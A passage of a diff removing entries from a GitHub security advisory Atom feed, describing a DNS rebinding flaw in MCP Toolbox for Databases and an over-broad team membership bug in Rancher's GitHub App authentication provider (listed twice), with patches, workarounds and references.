-<li><a href="https://github.com/advisories/GHSA-28pq-6qxg-wg5r">https://github.com/advisories/GHSA-28pq-6qxg-wg5r</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-28pq-6qxg-wg5r</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-07-01T20:56:10.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/googleapis/mcp-toolbox] MCP Toolbox for Databases vulnerable to DNS rebinding attacks]]></title>
-        <id>https://github.com/advisories/GHSA-7pf3-8xx7-rvhf</id>
-        <link href="https://github.com/advisories/GHSA-7pf3-8xx7-rvhf"/>
-        <updated>2026-07-01T20:54:23.000Z</updated>
-        <content type="html"><![CDATA[<p>Vulnerable to DNS rebinding attacks when using SSE (<a href="http://b/499408790">http://b/499408790</a>). During the beta phase, we implemented <code>allowed-origins</code> and <code>allowed-hosts</code> flags to align with MCP security guidelines. However, the hardcoded <code>Access-Control-Allow-Origin: *</code> header in the SSE initialization handler was inadvertently retained. This vulnerability specifically impacts users connecting via Toolbox using SSE under specification v2024-11-05.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-9739">https://nvd.nist.gov/vuln/detail/CVE-2026-9739</a></li>
-<li><a href="https://github.com/googleapis/mcp-toolbox/issues/3053">https://github.com/googleapis/mcp-toolbox/issues/3053</a></li>
-<li><a href="https://github.com/googleapis/mcp-toolbox/pull/3054">https://github.com/googleapis/mcp-toolbox/pull/3054</a></li>
-<li><a href="https://github.com/googleapis/mcp-toolbox/commit/c4c7bd917e686de68e2be866cfe3872c3439efae">https://github.com/googleapis/mcp-toolbox/commit/c4c7bd917e686de68e2be866cfe3872c3439efae</a></li>
-<li><a href="https://github.com/advisories/GHSA-7pf3-8xx7-rvhf">https://github.com/advisories/GHSA-7pf3-8xx7-rvhf</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-7pf3-8xx7-rvhf</uri>
-        </author>
-        <category label="severity" term="CRITICAL"/>
-        <published>2026-05-28T00:30:29.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/rancher/rancher] Rancher has over-inclusive team membership expansion in GitHub App authentication provider]]></title>
-        <id>https://github.com/advisories/GHSA-4j6x-2764-m8gh</id>
-        <link href="https://github.com/advisories/GHSA-4j6x-2764-m8gh"/>
-        <updated>2026-07-01T20:51:54.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
-<p>A vulnerability has been identified within Rancher Manager in the GitHub App authentication provider. When evaluating permissions, the provider incorrectly expands user team memberships to include all teams within the associated GitHub organization, rather than restricting access to the specific teams to which the user actually belongs. </p>
-<p>Specifically, when a user authenticates via the GitHub App provider, Rancher's team membership evaluation logic incorrectly handles cached data. Instead of checking the user-specific list, the evaluation logic iterates over all teams defined within the entire GitHub organization. The authentication provider should consult the correctly cached, per-user membership list to assign the user's specific group permissions. Consequently, any authenticated user who belongs to at least one team in a GitHub organization is mistakenly granted <code>group principals</code> for every team within that entire organization during authentication and authorization checks.</p>
-<p>This issue allows a malicious user who is a member of a low-privilege team within a GitHub organization to gain unauthorized access to or permissions for any other team in that organization. If those other teams are bound to Rancher login allowlists or RBAC roles (cluster-level, project-level, or global), the attacker can pass access checks that should otherwise fail, inheriting permissions they were never granted.</p>
-<p><strong>Exploitation of this vulnerability requires the following conditions to be met:</strong></p>
-<ul>
-<li>The GitHub App authentication provider must be enabled and configured for the target GitHub organization.</li>
-<li>The attacker must possess a valid GitHub account with membership in at least one team within that target organization. </li>
-<li>A separate team within the same GitHub organization must be explicitly mapped to Rancher RBAC roles or specified within Rancher's login allowlist (<code>allowedPrincipalIds</code>).</li>
-</ul>
-<p>Please consult the associated  <a href="https://attack.mitre.org/techniques/T1078/">MITRE ATT&amp;CK - Technique - Valid Accounts</a> for further information about this category of attack.</p>
-<h3 id="patches">Patches</h3>
-<p>This fix corrects the team listing logic to iterate only the teams stored in the per-user membership cache and includes a one-time startup migration that marks all affected User resources for refresh, forcing Rancher to rebuild <code>group principals</code> using the now-corrected logic.</p>
-<p>Patched versions of Rancher include releases <code>v2.14.2</code> and <code>v2.13.6</code>.</p>
-<h3 id="workarounds">Workarounds</h3>
-<p>If upgrading to a patched version immediately is not feasible, users are encouraged to  consider these temporary mitigations:</p>
-<ul>
-<li>Disable GitHub App authentication provider and switch to an alternative authentication provider (GitHub OAuth).</li>
-<li>Remove or restrict team-based <code>group principals</code> from allowed principalIds.</li>
-<li>Audit and temporarily remove RBAC bindings (<code>GlobalRoleBindings</code>, <code>ClusterRoleTemplateBindings</code>, <code>ProjectRoleTemplateBindings</code>) that reference GitHub App team <code>principals</code> until the patch is applied.</li>
-<li>Disable provider refresh and clean up inflated group membership for users (manually or by writing a script).</li>
-</ul>
-<p>These workarounds reduce the attack surface but do not eliminate the vulnerability. Existing user sessions and cached principals remain inflated until a provider refresh occurs. Upgrading to a patched version is strongly recommended.</p>
-<h3 id="references">References</h3>
-<p>If you have any questions or comments about this advisory:</p>
-<ul>
-<li>Reach out to the <a href="https://github.com/rancher/rancher/security/policy">SUSE Rancher Security team</a> for security related inquiries.</li>
-<li>Open an issue in the <a href="https://github.com/rancher/rancher/issues/new/choose">Rancher</a> repository.</li>
-<li>Verify with our <a href="https://www.suse.com/suse-rancher/support-matrix/all-supported-versions/">support matrix</a> and <a href="https://www.suse.com/lifecycle/">product support lifecycle</a>.</li>
-</ul>
-<h3 id="references-1">References</h3>
-<ul>
-<li><a href="https://github.com/rancher/rancher/security/advisories/GHSA-4j6x-2764-m8gh">https://github.com/rancher/rancher/security/advisories/GHSA-4j6x-2764-m8gh</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-41053">https://nvd.nist.gov/vuln/detail/CVE-2026-41053</a></li>
-<li><a href="https://github.com/rancher/rancher/pull/55093">https://github.com/rancher/rancher/pull/55093</a></li>
-<li><a href="https://github.com/rancher/rancher/pull/55147">https://github.com/rancher/rancher/pull/55147</a></li>
-<li><a href="https://github.com/rancher/rancher/commit/361d4d57cd09b87f3c53f88af42046ffaa7b57e4">https://github.com/rancher/rancher/commit/361d4d57cd09b87f3c53f88af42046ffaa7b57e4</a></li>
-<li><a href="https://github.com/rancher/rancher/commit/d0c047bbc6d202e953d7557b82cbb354367db6ae">https://github.com/rancher/rancher/commit/d0c047bbc6d202e953d7557b82cbb354367db6ae</a></li>
-<li><a href="https://github.com/advisories/GHSA-4j6x-2764-m8gh">https://github.com/advisories/GHSA-4j6x-2764-m8gh</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-4j6x-2764-m8gh</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-07-01T20:51:54.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/rancher/rancher] Rancher has over-inclusive team membership expansion in GitHub App authentication provider]]></title>
-        <id>https://github.com/advisories/GHSA-4j6x-2764-m8gh</id>
-        <link href="https://github.com/advisories/GHSA-4j6x-2764-m8gh"/>
-        <updated>2026-07-01T20:51:54.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
-<p>A vulnerability has been identified within Rancher Manager in the GitHub App authentication provider. When evaluating permissions, the provider incorrectly expands user team memberships to include all teams within the associated GitHub organization, rather than restricting access to the specific teams to which the user actually belongs. </p>
-<p>Specifically, when a user authenticates via the GitHub App provider, Rancher's team membership evaluation logic incorrectly handles cached data. Instead of checking the user-specific list, the evaluation logic iterates over all teams defined within the entire GitHub organization. The authentication provider should consult the correctly cached, per-user membership list to assign the user's specific group permissions. Consequently, any authenticated user who belongs to at least one team in a GitHub organization is mistakenly granted <code>group principals</code> for every team within that entire organization during authentication and authorization checks.</p>
-<p>This issue allows a malicious user who is a member of a low-privilege team within a GitHub organization to gain unauthorized access to or permissions for any other team in that organization. If those other teams are bound to Rancher login allowlists or RBAC roles (cluster-level, project-level, or global), the attacker can pass access checks that should otherwise fail, inheriting permissions they were never granted.</p>
-<p><strong>Exploitation of this vulnerability requires the following conditions to be met:</strong></p>
-<ul>
-<li>The GitHub App authentication provider must be enabled and configured for the target GitHub organization.</li>
-<li>The attacker must possess a valid GitHub account with membership in at least one team within that target organization. </li>
-<li>A separate team within the same GitHub organization must be explicitly mapped to Rancher RBAC roles or specified within Rancher's login allowlist (<code>allowedPrincipalIds</code>).</li>
-</ul>
-<p>Please consult the associated  <a href="https://attack.mitre.org/techniques/T1078/">MITRE ATT&amp;CK - Technique - Valid Accounts</a> for further information about this category of attack.</p>
-<h3 id="patches">Patches</h3>
-<p>This fix corrects the team listing logic to iterate only the teams stored in the per-user membership cache and includes a one-time startup migration that marks all affected User resources for refresh, forcing Rancher to rebuild <code>group principals</code> using the now-corrected logic.</p>
-<p>Patched versions of Rancher include releases <code>v2.14.2</code> and <code>v2.13.6</code>.</p>
-<h3 id="workarounds">Workarounds</h3>
-<p>If upgrading to a patched version immediately is not feasible, users are encouraged to  consider these temporary mitigations:</p>
-<ul>
-<li>Disable GitHub App authentication provider and switch to an alternative authentication provider (GitHub OAuth).</li>
-<li>Remove or restrict team-based <code>group principals</code> from allowed principalIds.</li>
-<li>Audit and temporarily remove RBAC bindings (<code>GlobalRoleBindings</code>, <code>ClusterRoleTemplateBindings</code>, <code>ProjectRoleTemplateBindings</code>) that reference GitHub App team <code>principals</code> until the patch is applied.</li>
-<li>Disable provider refresh and clean up inflated group membership for users (manually or by writing a script).</li>
-</ul>
-<p>These workarounds reduce the attack surface but do not eliminate the vulnerability. Existing user sessions and cached principals remain inflated until a provider refresh occurs. Upgrading to a patched version is strongly recommended.</p>
-<h3 id="references">References</h3>
-<p>If you have any questions or comments about this advisory:</p>
-<ul>
-<li>Reach out to the <a href="https://github.com/rancher/rancher/security/policy">SUSE Rancher Security team</a> for security related inquiries.</li>
-<li>Open an issue in the <a href="https://github.com/rancher/rancher/issues/new/choose">Rancher</a> repository.</li>
-<li>Verify with our <a href="https://www.suse.com/suse-rancher/support-matrix/all-supported-versions/">support matrix</a> and <a href="https://www.suse.com/lifecycle/">product support lifecycle</a>.</li>
-</ul>
-<h3 id="references-1">References</h3>
-<ul>
-<li><a href="https://github.com/rancher/rancher/security/advisories/GHSA-4j6x-2764-m8gh">https://github.com/rancher/rancher/security/advisories/GHSA-4j6x-2764-m8gh</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-41053">https://nvd.nist.gov/vuln/detail/CVE-2026-41053</a></li>
-<li><a href="https://github.com/rancher/rancher/pull/55093">https://github.com/rancher/rancher/pull/55093</a></li>
-<li><a href="https://github.com/rancher/rancher/pull/55147">https://github.com/rancher/rancher/pull/55147</a></li>
-<li><a href="https://github.com/rancher/rancher/commit/361d4d57cd09b87f3c53f88af42046ffaa7b57e4">https://github.com/rancher/rancher/commit/361d4d57cd09b87f3c53f88af42046ffaa7b57e4</a></li>
-<li><a href="https://github.com/rancher/rancher/commit/d0c047bbc6d202e953d7557b82cbb354367db6ae">https://github.com/rancher/rancher/commit/d0c047bbc6d202e953d7557b82cbb354367db6ae</a></li>
-<li><a href="https://github.com/advisories/GHSA-4j6x-2764-m8gh">https://github.com/advisories/GHSA-4j6x-2764-m8gh</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-4j6x-2764-m8gh</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-07-01T20:51:54.000Z</published>
     </entry>
 </feed>
